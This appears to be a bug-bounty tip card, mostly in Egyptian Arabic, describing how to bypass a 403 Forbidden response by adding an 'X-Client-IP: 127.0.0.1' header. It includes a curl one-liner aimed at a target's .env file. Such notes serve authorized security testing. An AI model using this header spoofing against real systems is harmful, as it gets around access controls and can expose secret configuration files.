# Bypass 403 Forbidden بإضافة X-Client-IP: 127.0.0.1

**Rating:** ⭐ جيدة  
**Category:** WAF Bypass, Recon  
**Status:** Not started  

## How It Works

بعض الـ WAFs أو الـ access control بيعتمد على headers بتوضح IP الطلب (زي X-Client-IP)، لو ضفت header بيقول إن الطلب جاي من localhost، السيرفر ممكن يعاملك كأنك مستخدم موثوق ويديك wall bypass لفتح 403 محمي.

## Payload / Code

```
X-Client-IP: 127.0.0.1

مثال تنفيذي:
curl -I https://target[.]com/.env -H "X-Client-IP: 127.0.0.1"

النتيجة المتوقعة: 403 يبقى 302/200 بعد إضافة الـ header
```

## Source

kjulius @ethical_h4ck3r_

---

_Synced from Notion: Bug Bounty Tips and Tricks. Authorized testing only._
